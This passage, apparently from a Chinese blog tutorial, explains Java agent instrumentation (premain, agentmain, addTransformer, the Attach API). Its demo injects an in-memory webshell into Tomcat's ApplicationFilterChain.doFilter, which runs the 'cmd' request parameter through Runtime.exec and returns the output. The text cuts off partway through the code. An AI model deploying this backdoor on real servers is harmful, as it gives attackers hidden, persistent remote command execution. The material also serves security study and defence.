<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">koishi</span><br><span class="line">premain method is invoked!</span><br><span class="line">Main <span class="keyword">class</span> <span class="title class_">Running</span>  </span><br></pre></td></tr></table></figure></div>

<p>可以发现 premain 确实在主要类之前执行了，而且 premain 方法的第一个参数 agentArgs 我们也是可传入的。</p>
<h4 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h4><p>在实现 premain 的时候，我们除了像上面的例子那样能获取到 agentArgs 参数，还可以获取 Instrumentation 实例。</p>
<p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p>
<p>在 Instrumentation 中增加了名叫 Transformer 的 Class 文件转换器，转换器可以改变二进制流的数据，Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码。</p>
<p>查看 Instrumentation  接口中的类方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单讲一下 addTransformer，getAllLoadedClasses，retransformClasses 三个方法的作用</p>
<h5 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses"></a>getAllLoadedClasses</h5><p>getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class。</p>
<h5 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses"></a>retransformClasses</h5><p>retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果。</p>
<h5 id="addTransformer-Demo"><a href="#addTransformer-Demo" class="headerlink" title="addTransformer-Demo"></a>addTransformer-Demo</h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器。如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p>
<p>写个简单的测试</p>
<p><strong>MainDemo.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I&#x27;m Main!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>PremainDemo.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PremainDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建类转换器实例</span></span><br><span class="line">        <span class="type">PremainDemo</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PremainDemo</span>();</span><br><span class="line">        inst.addTransformer(transformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里实现了 ClassFileTransformer 接口并自定义了 transform 方法，主要作用是输出被拦截的类名。</p>
<p><strong>Test.java</strong> </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Attributes;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.Manifest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        makePremainJar(MainDemo.class,<span class="string">&quot;I_main.jar&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        makePremainJar(PremainDemo.class,<span class="string">&quot;I_premain.jar&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makePremainJar</span><span class="params">(Class compileClass, String jarName, <span class="type">boolean</span> is_premain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarFilePath</span> <span class="operator">=</span> <span class="string">&quot;premain/src/main/java/jars/&quot;</span> + jarName;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> compileClass.getName().replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Manifest 并设置内容</span></span><br><span class="line">        <span class="type">Manifest</span> <span class="variable">manifest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manifest</span>();</span><br><span class="line">        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, <span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_premain) &#123;</span><br><span class="line">            <span class="comment">// 代理的类还需要添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Redefine-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Retransform-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置 Premain-Class</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Premain-Class&quot;</span>), compileClass.getName());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 class 和  Manifest 写入 jar 文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(jarFilePath);</span><br><span class="line">             <span class="type">JarOutputStream</span> <span class="variable">jos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(fos, manifest)) &#123;</span><br><span class="line">            jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(className));</span><br><span class="line">            <span class="type">byte</span>[] bytes = pool.get(compileClass.getName()).toBytecode();</span><br><span class="line">            jos.write(bytes);</span><br><span class="line">            jos.closeEntry();</span><br><span class="line">            System.out.println(<span class="string">&quot;JAR file created successfully!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>本类将上面的两个 java 处理为 jar 文件，并设置好 manifest 的内容，启动后可以发现输出了很多内容，我们也可以写一个简单的 spring 服务，通过 premain 的方式注入自己的 filter 内容（以 filter 为例）</p>
<h5 id="addTransformer-注入内存马"><a href="#addTransformer-注入内存马" class="headerlink" title="addTransformer-注入内存马"></a>addTransformer-注入内存马</h5><p>通过之前对内存马的学习， <code>org.apache.catalina.core.ApplicationFilterChain</code>下的 <code>internalDoFilter</code> 或者 <code>doFilter</code> 方法</p>
<p>都拥有<code>Request</code>和<code>Response</code>参数，修改一个就可以控制所有的请求与响应。</p>
<p>这里使用 javassist 对被拦截的类方法进行修改，修改如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> _InstrumentationTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PremainDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">targetClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建类转换器实例</span></span><br><span class="line">        <span class="type">PremainDemo</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PremainDemo</span>();</span><br><span class="line">        inst.addTransformer(transformer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(targetClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="comment">// 需要加入这段内容，否则会出现 javassist 找不到 ApplicationFilterChain 的报错</span></span><br><span class="line">            pool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  $1;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = $2;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>随后将该内容打 jar 包，之后将其启动</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-javaagent</span>:I_premain.jar <span class="literal">-jar</span> SpringDemo.jar</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240311154518684.png"
                      alt="image-20240311154518684"
                ></p>
<p>发现注入成功。</p>
<h3 id="agentmain-启动后加载-agent"><a href="#agentmain-启动后加载-agent" class="headerlink" title="agentmain-启动后加载 agent"></a>agentmain-启动后加载 agent</h3><p>我们内存马注入的情况都是处于 JVM 已运行了的情况，所以上面的方法就不是很有用，不过在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent ，然而 Attach API 在 tool.jar 中，jvm 启动时是默认不加载该依赖的，需要我们在 classpath 中额外进行指定</p>
<p>启动后加载 agent 通过新的代理操作来实现：agentmain，使得可以在 main 函数开始运行之后再运行</p>
<p>和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure></div>

<p>要求和之前类似，这里我们去实现 agentmain 方法，还要在<code>META-INF/MANIFEST.MF</code>中加入<code>Agent-Class</code></p>
<p>Attach API 很简单，只有 2 个主要的类，都在 <code>com.sun.tools.attach</code> 包里面。着重关注的是<code>VitualMachine</code>这个类。</p>
<p>（所以记得导入本地的 tools.jar 作为依赖）</p>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title function_">list</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title function_">attach</span><span class="params">(String id)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadAgent</span><span class="params">(String agent)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h4><p>VirtualMachineDescriptor 是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。</p>
<h4 id="获取Java程序进程"><a href="#获取Java程序进程" class="headerlink" title="获取Java程序进程"></a>获取Java程序进程</h4><p>可以使用自带的 <code>jps -l</code> 命令去查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240311214358589.png"
                      alt="image-20240311214358589"
                ></p>
<p>也可以通过代码去获取</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">       <span class="keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : list) &#123;</span><br><span class="line">           System.out.println(virtualMachineDescriptor+<span class="string">&quot;\n&quot;</span>+virtualMachineDescriptor.id());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>知道上面的内容后，就可以自己简单写个项目手动为其添加 agent.jar</p>
<p>先写个 ClassFileTransformer 的实现类，并自定义实现 transform  方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;加载类：&quot;</span>+className);</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>打 jar 包</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_Maker</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        makePremainJar(AgentDemo.class,<span class="string">&quot;agentmain.jar&quot;</span>,<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">makePremainJar</span><span class="params">(Class compileClass, String jarName, String libPath, <span class="type">boolean</span> is_premain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarFilePath</span> <span class="operator">=</span> <span class="string">&quot;agentmain/src/main/java/Demo/jars/&quot;</span> + jarName;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> compileClass.getName().replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 Manifest 并设置内容</span></span><br><span class="line">        <span class="type">Manifest</span> <span class="variable">manifest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Manifest</span>();</span><br><span class="line">        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, <span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_premain) &#123;</span><br><span class="line">            <span class="comment">// 代理的类还需要添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Redefine-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Can-Retransform-Classes&quot;</span>), <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">// 设置 Premain-Class</span></span><br><span class="line">            manifest.getMainAttributes().put(<span class="keyword">new</span> <span class="title class_">Attributes</span>.Name(<span class="string">&quot;Agent-Class&quot;</span>), compileClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 class 和  Manifest 写入 jar 文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(jarFilePath);</span><br><span class="line">             <span class="type">JarOutputStream</span> <span class="variable">jos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(fos, manifest)) &#123;</span><br><span class="line">            jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(className));</span><br><span class="line">            <span class="type">byte</span>[] bytes = pool.get(compileClass.getName()).toBytecode();</span><br><span class="line">            jos.write(bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果有 jar 依赖需要打入，则进行操作</span></span><br><span class="line">            <span class="keyword">if</span>(libPath != <span class="literal">null</span> &amp;&amp; !libPath.isEmpty())&#123;</span><br><span class="line">                File[] dependencyFiles = <span class="keyword">new</span> <span class="title class_">File</span>(libPath).listFiles();</span><br><span class="line">                <span class="keyword">if</span> (dependencyFiles!=<span class="literal">null</span> &amp;&amp; dependencyFiles.length!=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span> (File dependencyFile : dependencyFiles) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">extraJarPath</span> <span class="operator">=</span> dependencyFile.getAbsolutePath();</span><br><span class="line">                        addJarToJar(jos, extraJarPath);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            jos.closeEntry();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;JAR file created successfully!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addJarToJar</span><span class="params">(JarOutputStream jos, String jarFilePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JarFile</span> <span class="variable">jarFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarFile</span>(jarFilePath);</span><br><span class="line">        jarFile.stream().forEach(jarEntry -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (!jarEntry.getName().equals(<span class="string">&quot;META-INF/MANIFEST.MF&quot;</span>) &amp;&amp; !jarEntry.getName().equals(<span class="string">&quot;META-INF/&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(jarEntry.getName()));</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> jarFile.getInputStream(jarEntry);</span><br><span class="line">                    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span 